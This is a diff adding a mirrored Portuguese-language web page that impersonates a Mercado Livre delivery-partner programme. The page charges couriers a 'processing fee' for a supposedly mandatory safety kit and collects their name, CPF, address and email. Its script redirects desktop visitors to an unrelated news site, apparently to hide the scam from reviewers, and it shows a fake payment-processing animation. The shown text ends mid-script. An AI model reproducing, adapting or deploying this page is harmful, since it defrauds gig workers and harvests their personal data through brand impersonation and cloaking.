@@ -1,0 +1,1259 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+
+<!-- Mirrored from informacoesconfirmadas.shop/entrega.html? by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 07 Mar 2026 21:25:11 GMT -->
+<head>
+    <script src="scripts/utms/latest-3.html" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kit de Segurança Obrigatório</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+    <link href="css2-33585.html?family=Inter:wght@400;500;600;700;800&amp;display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --ml-yellow: #FFE600;
+            --ml-yellow-dark: #E6CF00;
+            --ml-yellow-light: #FFF9C4;
+            --ml-yellow-extra-light: #FFFDE7;
+            --ml-blue: #3483FA;
+            --ml-blue-dark: #2968C8;
+            --ml-blue-light: #E8F4FD;
+            --ml-dark: #333333;
+            --ml-gray: #666666;
+            --ml-gray-light: #999999;
+            --ml-bg-light: #F5F5F5;
+            --ml-white: #FFFFFF;
+            --ml-green: #00A650;
+            --ml-green-light: #E8F5E9;
+            --ml-red: #F23D4F;
+            --ml-orange: #FF6B35;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            color: var(--ml-dark);
+            line-height: 1.6;
+            background: var(--ml-white);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Header */
+        .header {
+            background: var(--ml-yellow);
+            padding: 12px 20px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .logo-img {
+            height: 40px;
+            width: auto;
+        }
+
+        /* Header Badge - Motorista Parceiro */
+        .header-badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: var(--ml-blue);
+            padding: 6px 12px;
+            border-radius: 25px;
+        }
+
+        .header-badge-icon {
+            color: var(--ml-yellow);
+            display: flex;
+            align-items: center;
+        }
+
+        .header-badge-icon svg {
+            width: 18px;
+            height: 18px;
+        }
+
+        .header-badge-text {
+            display: flex;
+            flex-direction: column;
+            line-height: 1.1;
+        }
+
+        .header-badge-title {
+            font-size: 12px;
+            font-weight: 700;
+            color: var(--ml-white);
+        }
+
+        .header-badge-subtitle {
+            font-size: 10px;
+            font-weight: 400;
+            color: rgba(255,255,255,0.9);
+        }
+
+        @media (max-width: 400px) {
+            .header-badge {
+                padding: 5px 10px;
+            }
+            
+            .header-badge-title {
+                font-size: 11px;
+            }
+            
+            .header-badge-subtitle {
+                font-size: 9px;
+            }
+            
+            .header-badge-icon svg {
+                width: 14px;
+                height: 14px;
+            }
+        }
+
+        /* Perfil do Entregador */
+        .perfil-entregador {
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            border-bottom: 1px solid #dee2e6;
+            padding: 12px 20px;
+        }
+
+        .perfil-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .perfil-avatar {
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            overflow: hidden;
+            flex-shrink: 0;
+            border: 2px solid var(--ml-blue);
+        }
+
+        .perfil-avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .perfil-info {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .perfil-label {
+            font-size: 11px;
+            color: var(--ml-gray-light);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 2px;
+        }
+
+        .perfil-nome {
+            font-size: 15px;
+            font-weight: 700;
+            color: var(--ml-dark);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .perfil-cpf {
+            font-size: 13px;
+            color: var(--ml-gray);
+            font-weight: 500;
+        }
+
+        .perfil-badge {
+            background: var(--ml-green);
+            color: white;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+            white-space: nowrap;
+        }
+
+        @media (max-width: 480px) {
+            .perfil-entregador {
+                padding: 10px 15px;
+            }
+
+            .perfil-avatar {
+                width: 40px;
+                height: 40px;
+            }
+
+            .perfil-avatar svg {
+                width: 20px;
+                height: 20px;
+            }
+
+            .perfil-nome {
+                font-size: 14px;
+            }
+
+            .perfil-cpf {
+                font-size: 12px;
+            }
+        }
+
+        /* Main Content */
+        .main-content {
+            flex: 1;
+            padding: 30px 20px;
+            max-width: 550px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        /* Kit Header */
+        .kit-header {
+            background: linear-gradient(135deg, var(--ml-yellow) 0%, var(--ml-yellow-dark) 100%);
+            padding: 18px 20px;
+            margin: -30px -20px 25px -20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .kit-header-icon {
+            width: 40px;
+            height: 40px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .kit-header-icon svg {
+            width: 22px;
+            height: 22px;
+            color: var(--ml-dark);
+        }
+
+        .kit-header-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--ml-dark);
+        }
+
+        /* Kit Image */
+        .kit-image {
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto 25px;
+            display: block;
+        }
+
+        /* Kit Info */
+        .kit-title {
+            font-size: 22px;
+            font-weight: 800;
+            color: var(--ml-dark);
+            margin-bottom: 15px;
+        }
+
+        .kit-description {
+            font-size: 15px;
+            color: var(--ml-gray);
+            line-height: 1.7;
+            margin-bottom: 25px;
+        }
+
+        /* Incluso Box */
+        .incluso-box {
+            background: var(--ml-white);
+            border: 2px solid var(--ml-bg-light);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 25px;
+        }
+
+        .incluso-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--ml-dark);
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .incluso-title::before {
+            content: '✓';
+            width: 24px;
+            height: 24px;
+            background: var(--ml-green);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .incluso-list {
+            list-style: none;
+            padding-left: 0;
+        }
+
+        .incluso-list li {
+            font-size: 14px;
+            color: var(--ml-gray);
+            margin-bottom: 10px;
+            line-height: 1.5;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .incluso-list li::before {
+            content: '•';
+            color: var(--ml-yellow-dark);
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        /* Pricing */
+        .pricing-section {
+            margin-bottom: 30px;
+        }
+
+        .pricing-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+        }
+
+        .pricing-label {
+            font-size: 16px;
+            color: var(--ml-dark);
+        }
+
+        .pricing-value {
+            font-size: 16px;
+            color: var(--ml-gray);
+        }
+
+        .pricing-value.old {
+            text-decoration: line-through;
+            color: var(--ml-gray-light);
+        }
+
+        .pricing-value.current {
+            font-weight: 700;
+            color: var(--ml-dark);
+        }
+
+        .pricing-row.savings {
+            margin-top: 5px;
+        }
+
+        .pricing-row.savings .pricing-label {
+            font-weight: 700;
+            color: var(--ml-green);
+        }
+
+        .pricing-row.savings .pricing-value {
+            font-weight: 700;
+            color: var(--ml-green);
+            font-size: 18px;
+        }
+
+        /* Form Section */
+        .form-section {
+            background: var(--ml-white);
+            border: 2px solid var(--ml-bg-light);
+            border-radius: 16px;
+            overflow: hidden;
+            margin-bottom: 25px;
+        }
+
+        .form-header {
+            background: linear-gradient(135deg, var(--ml-yellow) 0%, var(--ml-yellow-dark) 100%);
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .form-header-icon {
+            width: 32px;
+            height: 32px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .form-header-icon svg {
+            width: 18px;
+            height: 18px;
+            color: var(--ml-dark);
+        }
+
+        .form-header-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--ml-dark);
+        }
+
+        .form-body {
+            padding: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--ml-dark);
+            margin-bottom: 8px;
+        }
+
+        .form-label .required {
+            color: var(--ml-red);
+        }
+
+        .form-input,
+        .form-select {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid var(--ml-bg-light);
+            border-radius: 10px;
+            font-size: 15px;
+            font-family: inherit;
+            color: var(--ml-dark);
+            transition: all 0.3s ease;
+            background: var(--ml-white);
+        }
+
+        .form-select {
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='%23999999' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 12px center;
+            background-size: 20px;
+            padding-right: 40px;
+            cursor: pointer;
+        }
+
+        .form-input:focus,
+        .form-select:focus {
+            outline: none;
+            border-color: var(--ml-yellow-dark);
+            box-shadow: 0 0 0 4px rgba(255, 230, 0, 0.2);
+        }
+
+        .form-input::placeholder {
+            color: var(--ml-gray-light);
+        }
+
+        /* Delivery Info Box */
+        .delivery-info {
+            background: var(--ml-yellow-extra-light);
+            border: 2px solid var(--ml-yellow-light);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 25px;
+        }
+
+        .delivery-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--ml-dark);
+            margin-bottom: 12px;
+        }
+
+        .delivery-list {
+            list-style: disc;
+            padding-left: 25px;
+        }
+
+        .delivery-list li {
+            font-size: 14px;
+            color: var(--ml-gray);
+            margin-bottom: 6px;
+            line-height: 1.5;
+        }
+
+        /* Submit Button */
+        .btn-submit {
+            width: 100%;
+            padding: 20px;
+            background: linear-gradient(135deg, var(--ml-blue) 0%, var(--ml-blue-dark) 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-submit:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(52, 131, 250, 0.3);
+        }
+
+        .btn-submit:disabled {
+            background: var(--ml-gray-light);
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .security-text {
+            text-align: center;
+            font-size: 13px;
+            color: var(--ml-gray);
+            margin-top: 12px;
+        }
+
+        /* Footer */
+        .footer {
+            background: var(--ml-yellow);
+            padding: 30px 20px;
+            text-align: center;
+            margin-top: auto;
+        }
+
+        .footer-logo {
+            margin-bottom: 15px;
+        }
+
+        .footer-logo img {
+            height: 40px;
+            width: auto;
+        }
+
+        .footer p {
+            font-size: 13px;
+            color: var(--ml-dark);
+            margin-bottom: 5px;
+        }
+
+        .footer-title {
+            font-size: 15px;
+            font-weight: 700;
+            color: var(--ml-dark);
+            margin: 15px 0 5px;
+        }
+
+        /* Loading Overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--ml-yellow);
+            z-index: 9999;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .loading-logo {
+            margin-bottom: 30px;
+        }
+
+        .loading-logo img {
+            height: 60px;
+            width: auto;
+        }
+
+        .loading-title {
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--ml-dark);
+            margin-bottom: 30px;
+            text-align: center;
+        }
+
+        .loading-box {
+            width: 100%;
+            max-width: 420px;
+        }
+
+        .loading-step {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 16px 0;
+            transition: all 0.3s ease;
+            border-bottom: 1px solid rgba(0,0,0,0.08);
+        }
+
+        .loading-step:last-child {
+            border-bottom: none;
+        }
+
+        .loading-step.pending {
+            opacity: 0.4;
+        }
+
+        .loading-step.active,
+        .loading-step.completed {
+            opacity: 1;
+        }
+
+        .loading-step-icon {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            font-size: 16px;
+            font-weight: 700;
+            color: rgba(0,0,0,0.3);
+        }
+
+        .loading-step.active .loading-step-icon,
+        .loading-step.completed .loading-step-icon {
+            background: var(--ml-blue);
+            color: white;
+        }
+
+        .loading-step-icon svg {
+            width: 24px;
+            height: 24px;
+            color: white;
+        }
+
+        .loading-step-text {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--ml-dark);
+        }
+
+        .loading-step.pending .loading-step-text {
+            color: rgba(0,0,0,0.4);
+        }
+
+        .success-box {
+            background: transparent;
+            border-radius: 16px;
+            padding: 25px;
+            margin-top: 20px;
+            text-align: center;
+            display: none;
+        }
+
+        .success-box.active {
+            display: block;
+        }
+
+        .success-icon {
+            width: 50px;
+            height: 50px;
+            background: var(--ml-green);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+        }
+
+        .success-icon svg {
+            width: 28px;
+            height: 28px;
+            color: white;
+        }
+
+        .success-text {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--ml-green);
+            line-height: 1.4;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .kit-header {
+                margin: -30px -20px 20px -20px;
+                padding: 14px 15px;
+            }
+
+            .kit-header-icon {
+                width: 35px;
+                height: 35px;
+            }
+
+            .kit-header-icon svg {
+                width: 18px;
+                height: 18px;
+            }
+
+            .kit-header-title {
+                font-size: 16px;
+            }
+
+            .kit-title {
+                font-size: 20px;
+            }
+
+            .form-header {
+                padding: 12px 15px;
+            }
+
+            .form-header-icon {
+                width: 28px;
+                height: 28px;
+            }
+
+            .form-header-icon svg {
+                width: 16px;
+                height: 16px;
+            }
+
+            .form-header-title {
+                font-size: 15px;
+            }
+
+            .form-body {
+                padding: 15px;
+            }
+
+            .btn-submit {
+                padding: 18px;
+                font-size: 16px;
+            }
+
+            .loading-box {
+                padding: 25px 20px;
+            }
+        }
+    </style>
+<script>
+  window.pixelId = "6987d3b2e68b6f5a7bf9e036";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "../cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script src="../cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-subids async defer></script>
+<script type="text/javascript">
+    // Verifica o dispositivo e redireciona antes de carregar outros recursos
+    if (!/iPhone|iPod|iPad|Android|BlackBerry|IEMobile/i.test(navigator.userAgent) && window.innerWidth > 768) {
+      window.location.replace('https://gironews.com/negocios/fidelizacao-em-parceria-54183/');
+    }
+  </script>
+</head>
+<body>
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-logo">
+            <div style="display: flex; align-items: center; gap: 10px;">
+                <img src="053Pbb0T/image-3.png" alt="" style="width: 50px; height: auto;">
+                <div style="display: flex; flex-direction: column; line-height: 1.05;">
+                    <span style="font-size: 24px; font-weight: 700; color: #2D3277;">mercado</span>
+                    <span style="font-size: 24px; font-weight: 700; color: #2D3277;">entregadores</span>
+                </div>
+            </div>
+        </div>
+        <h2 class="loading-title">Processando Pedido</h2>
+        <div class="loading-box">
+            <div class="loading-step pending" id="loadStep1">
+                <div class="loading-step-icon">1</div>
+                <span class="loading-step-text">Validando endereço de entrega</span>
+            </div>
+            <div class="loading-step pending" id="loadStep2">
+                <div class="loading-step-icon">2</div>
+                <span class="loading-step-text">Reservando kit de segurança</span>
+            </div>
+            <div class="loading-step pending" id="loadStep3">
+                <div class="loading-step-icon">3</div>
+                <span class="loading-step-text">Gerando código de rastreamento</span>
+            </div>
+            <div class="loading-step pending" id="loadStep4">
+                <div class="loading-step-icon">4</div>
+                <span class="loading-step-text">Processando pagamento</span>
+            </div>
+            <div class="loading-step pending" id="loadStep5">
+                <div class="loading-step-icon">5</div>
+                <span class="loading-step-text">Finalizando pedido</span>
+            </div>
+
+            <div class="success-box" id="successBox">
+                <div class="success-icon">
+                    <svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3">
+                        <polyline points="20 6 9 17 4 12"></polyline>
+                    </svg>
+                </div>
+                <p class="success-text">Pedido realizado<br>com sucesso!</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <div style="display: flex; align-items: center; gap: 10px;">
+                <img src="053Pbb0T/image-3.png" alt="" style="width: 40px; height: auto;">
+                <div style="display: flex; flex-direction: column; line-height: 1.05;">
+                    <span style="font-size: 20px; font-weight: 700; color: #2D3277;">mercado</span>
+                    <span style="font-size: 20px; font-weight: 700; color: #2D3277;">entregadores</span>
+                </div>
+            </div>
+            <div class="header-badge">
+                <div class="header-badge-icon">
+                    <svg viewbox="0 0 24 24" fill="currentColor">
+                        <path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"></path>
+                        <path d="M4.59 16.59L9.17 12 4.59 7.41 6 6l6 6-6 6-1.41-1.41z"></path>
+                    </svg>
+                </div>
+                <div class="header-badge-text">
+                    <span class="header-badge-title">Motorista Parceiro</span>
+                    <span class="header-badge-subtitle">Mercado Entregadores</span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Perfil do Entregador -->
+    <div class="perfil-entregador">
+        <div class="perfil-content">
+            <div class="perfil-avatar">
+                <img src="MG1K2RMB/MOTORISTA-2.png" alt="Foto do Entregador">
+            </div>
+            <div class="perfil-info">
+                <div class="perfil-label">Entregador Parceiro</div>
+                <div class="perfil-nome" id="perfilNome">Carregando...</div>
+                <div class="perfil-cpf" id="perfilCpf">CPF: ---</div>
+            </div>
+            <div class="perfil-badge">✓ Verificado</div>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <!-- Kit Header -->
+        <div class="kit-header">
+            <div class="kit-header-icon">
+                <svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M20 7l-8-4-8 4m16 0l-8 4m8-4v10l-8 4m0-10L4 7m8 4v10M4 7v10l8 4"></path>
+                </svg>
+            </div>
+            <h1 class="kit-header-title">Kit de Segurança Obrigatório</h1>
+        </div>
+
+        <!-- Kit Image -->
+        <img src="J49Lr0WZ/ROUPA.png" alt="Kit de Segurança Mercado Entregadores" class="kit-image">
+
+        <!-- Kit Info -->
+        <h2 class="kit-title">Kit de Segurança Oficial Mercado Entregadores</h2>
+        <p class="kit-description">Kit completo com todos os equipamentos de segurança necessários para iniciar suas atividades como entregador Mercado Entregadores. Enviado gratuitamente para todo o Brasil.</p>
+
+        <!-- Incluso Box -->
+        <div class="incluso-box">
+            <h3 class="incluso-title">O que está incluso</h3>
+            <ul class="incluso-list">
+                <li>Colete refletivo oficial</li>
+                <li>Luvas de segurança</li>
+                <li>Botas de segurança</li>
+                <li>Suporte para celular</li>
+                <li>Manual do entregador</li>
+            </ul>
+        </div>
+
+        <!-- Pricing -->
+        <div class="pricing-section">
+            <div class="pricing-row">
+                <span class="pricing-label">Kit de Segurança</span>
+                <span class="pricing-value old">R$ 149,90</span>
+            </div>
+            <div class="pricing-row">
+                <span class="pricing-label">Taxa de processamento</span>
+                <span class="pricing-value current">R$ 79,90</span>
+            </div>
+            <div class="pricing-row savings">
+                <span class="pricing-label">Você economiza</span>
+                <span class="pricing-value">R$ 70,00</span>
+            </div>
+        </div>
+
+        <!-- Form Section -->
+        <div class="form-section">
+            <div class="form-header">
+                <div class="form-header-icon">
+                    <svg viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path>
+                        <circle cx="12" cy="10" r="3"></circle>
+                    </svg>
+                </div>
+                <h3 class="form-header-title">Dados para Entrega</h3>
+            </div>
+            <div class="form-body">
+                <div class="form-group">
+                    <label class="form-label">Nome Completo <span class="required">*</span></label>
+                    <input type="text" class="form-input" id="nome" placeholder="Seu nome completo">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">CEP <span class="required">*</span></label>
+                    <input type="text" class="form-input" id="cep" placeholder="00000-000" maxlength="9">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Logradouro <span class="required">*</span></label>
+                    <input type="text" class="form-input" id="logradouro" placeholder="Rua, Avenida, etc.">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Número <span class="required">*</span></label>
+                    <input type="text" class="form-input" id="numero" placeholder="Número da residência">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Complemento</label>
+                    <input type="text" class="form-input" id="complemento" placeholder="Apto, Casa, etc. (opcional)">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Bairro <span class="required">*</span></label>
+                    <input type="text" class="form-input" id="bairro" placeholder="Nome do bairro">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Cidade <span class="required">*</span></label>
+                    <input type="text" class="form-input" id="cidade" placeholder="Nome da cidade">
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Estado <span class="required">*</span></label>
+                    <select class="form-select" id="estado">
+                        <option value="">Selecione o estado</option>
+                        <option value="AC">Acre</option>
+                        <option value="AL">Alagoas</option>
+                        <option value="AP">Amapá</option>
+                        <option value="AM">Amazonas</option>
+                        <option value="BA">Bahia</option>
+                        <option value="CE">Ceará</option>
+                        <option value="DF">Distrito Federal</option>
+                        <option value="ES">Espírito Santo</option>
+                        <option value="GO">Goiás</option>
+                        <option value="MA">Maranhão</option>
+                        <option value="MT">Mato Grosso</option>
+                        <option value="MS">Mato Grosso do Sul</option>
+                        <option value="MG">Minas Gerais</option>
+                        <option value="PA">Pará</option>
+                        <option value="PB">Paraíba</option>
+                        <option value="PR">Paraná</option>
+                        <option value="PE">Pernambuco</option>
+                        <option value="PI">Piauí</option>
+                        <option value="RJ">Rio de Janeiro</option>
+                        <option value="RN">Rio Grande do Norte</option>
+                        <option value="RS">Rio Grande do Sul</option>
+                        <option value="RO">Rondônia</option>
+                        <option value="RR">Roraima</option>
+                        <option value="SC">Santa Catarina</option>
+                        <option value="SP">São Paulo</option>
+                        <option value="SE">Sergipe</option>
+                        <option value="TO">Tocantins</option>
+                    </select>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Email</label>
+                    <input type="email" class="form-input" id="email" placeholder="seu@email.com">
+                </div>
+            </div>
+        </div>
+
+        <!-- Delivery Info -->
+        <div class="delivery-info">
+            <h3 class="delivery-title">Informações de Entrega:</h3>
+            <ul class="delivery-list">
+                <li>Entrega gratuita para todo o Brasil</li>
+                <li>Prazo de entrega: 5 a 10 dias úteis</li>
+                <li>Rastreamento enviado por email</li>
+                <li>Não é necessário estar em casa no momento da entrega</li>
+            </ul>
+        </div>
+
+        <!-- Submit Button -->
+        <button class="btn-submit" id="btnReceber">RECEBER KIT DE SEGURANÇA</button>
+        <p class="security-text">Pagamento processado com segurança pelo Mercado Entregadores</p>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-logo">
+            <div style="display: flex; align-items: center; justify-content: center; gap: 10px;">
+                <img src="053Pbb0T/image-3.png" alt="" style="width: 40px; height: auto;">
+                <div style="display: flex; flex-direction: column; line-height: 1.05;">
+                    <span style="font-size: 20px; font-weight: 700; color: #2D3277;">mercado</span>
+                    <span style="font-size: 20px; font-weight: 700; color: #2D3277;">entregadores</span>
+                </div>
+            </div>
+        </div>
+        <p>© 2025 Mercado Entregadores. Todos os direitos reservados.</p>
+        <p><strong>Programa de Parceiros Entregadores</strong></p>
+        <p>Trabalhe conosco e faça parte da nossa equipe de entregas</p>
+    </footer>
+
+    <script>
+        // Capturar parâmetros da URL
+        const urlParams = new URLSearchParams(window.location.search);
+        
+        // Carregar dados do localStorage e preencher campos automaticamente
+        document.addEventListener('DOMContentLoaded', function() {
+            const userData = JSON.parse(localStorage.getItem('userData') || '{}');
+            
+            // Preencher userData com parâmetros da URL (prioridade para URL)
+            urlParams.forEach((value, key) => {
+                userData[key] = value;
+            });
+            localStorage.setItem('userData', JSON.stringify(userData));
+            
+            // Carregar perfil do entregador
+            function carregarPerfil() {
+                const nome = userData.nome || 'Não informado';
+                const cpf = userData.cpf || '000.000.000-00';
+                
+                // Formatar CPF para exibição parcial (privacidade)
+                const cpfFormatado = cpf.replace(/(\d{3})\.(\d{3})\.(\d{3})-(\d{2})/, '$1.***.***-$4');
+                
+                document.getElementById('perfilNome').textContent = nome;
+                document.getElementById('perfilCpf').textContent = 'CPF: ' + cpfFormatado;
+            }
+            
+            // Carregar perfil
+            carregarPerfil();
+            
+            // Preencher nome
+            if (userData.nome) {
+                document.getElementById('nome').value = userData.nome;
+            }
+            
+            // Preencher CEP e buscar endereço
+            if (userData.cep) {
+                document.getElementById('cep').value = userData.cep;
+                // Buscar endereço automaticamente
+                const cep = userData.cep.replace(/\D/g, '');
+                if (cep.length === 8) {
+                    fetch(`https://viacep.com.br/ws/${cep}/json/`)
+                        .then(response => response.json())
+                        .then(data => {
+                            if (!data.erro) {
+                                document.getElementById('logradouro').value = data.logradouro || '';
+                                document.getElementById('bairro').value = data.bairro || '';
+                                document.getElementById('cidade').value = data.localidade || '';
+                                document.getElementById('estado').value = data.uf || '';
+                            }
+                        })
+                        .catch(error => console.log('Erro ao buscar CEP'));
+                }
+            }
+            
+            // Preencher estado se disponível
+            if (userData.estado) {
+                document.getElementById('estado').value = userData.estado;
+            }
+            
+            // Preencher cidade se disponível
+            if (userData.cidade) {
+                document.getElementById('cidade').value = userData.cidade;
+            }
+        });
+
+        // Máscara CEP
+        document.getElementById('cep').addEventListener('input', function(e) {
+            let valor = e.target.value.replace(/\D/g, '');
+            if (valor.length > 8) valor = valor.slice(0, 8);
+            if (valor.length > 5) {
+                valor = valor.replace(/(\d{5})(\d{1,3})/, '$1-$2');
+            }
+            e.target.value = valor;
+        });
+
+        // Buscar CEP
+        document.getElementById('cep').addEventListener('blur', function(e) {
+            const cep = e.target.value.replace(/\D/g, '');
+            if (cep.length === 8) {
+                fetch(`https://viacep.com.br/ws/${cep}/json/`)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (!data.erro) {
+                            document.getElementById('logradouro').value = data.logradouro || '';
+                            document.getElementById('bairro').value = data.bairro || '';
+                            document.getElementById('cidade').value = data.localidade || '';
+                            document.getElementById('estado').value = data.uf || '';
+                        }
+                    })
+                    .catch(error => console.log('Erro ao buscar CEP'));
+            }
+        });
+
+        // Submit
+        document.getElementById('btnReceber').addEventListener('click', function() {
+            const nome = document.getElementById('nome').value.trim();
+            const cep = document.getElementById('cep').value.trim();
+            const logradouro = document.getElementById('logradouro').value.trim();
+            const numero = document.getElementById('numero').value.trim();
+            const bairro = document.getElementById('bairro').value.trim();
+            const cidade = document.getElementById('cidade').value.trim();
+            const estado = document.getElementById('estado').value;
+
+            if (!nome) {
+                alert('Por favor, informe seu nome completo.');
+                return;
+            }
+            if (!cep) {
+                alert('Por favor, informe o CEP.');
+                return;
+            }
+            if (!logradouro) {
+                alert('Por favor, informe o logradouro.');
+                return;
+            }
+            if (!numero) {
+                alert('Por favor, informe o número.');
+                return;
+            }
+            if (!bairro) {
+                alert('Por favor, informe o bairro.');
+                return;
+            }
+            if (!cidade) {
+                alert('Por favor, informe a cidade.');
+                return;
+            }
+            if (!estado) {
+                alert('Por favor, selecione o estado.');
+                return;
+            }
+
+            // Salvar dados de endereço no localStorage
+            const existingData = JSON.parse(localStorage.getItem('userData') || '{}');
+            const userData = {
+                ...existingData,
+                nomeCompleto: nome,
+                endereco: {
+                    cep: cep,
+                    logradouro: logradouro,
+                    numero: numero,
+                    complemento: document.getElementById('complemento').value.trim(),
+                    bairro: bairro,
+                    cidade: cidade,
+                    estado: estado
+                },
+                email: document.getElementById('email').value.trim()
+            };
+            localStorage.setItem('userData', JSON.stringify(userData));
+
+            iniciarLoading();
+        });
+
+        // Loading Process
+        function iniciarLoading() {
+            const loadingOverlay = document.getElementById('loadingOverlay');
+            const successBox = document.getElementById('successBox');
+
+            loadingOverlay.classList.add('active');
+            document.body.style.overflow = 'hidden';
+
+            const steps = [
+                document.getElementById('loadStep1'),
+                document.getElementById('loadStep2'),
+                document.getElementById('loadStep3'),
+                document.getElementById('loadStep4'),
+                document.getElementById('loadStep5')
+            ];
+
+            const checkIcon = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>`;
+
+            let currentStep = 0;
+
+            function processStep() {
+                if (currentStep < steps.length) {
+                    steps[currentStep].classList.remove('pending');
+                    steps[currentStep].classList.add('active');
+
+                    setTimeout(() => {
+                        steps[currentStep].classList.remove('active');
+                        steps[currentStep].classList.add('completed');
+                        steps[currentStep].querySelector('.loading-step-icon').innerHTML = checkIcon;
+                        
+                        currentStep++;
+                        
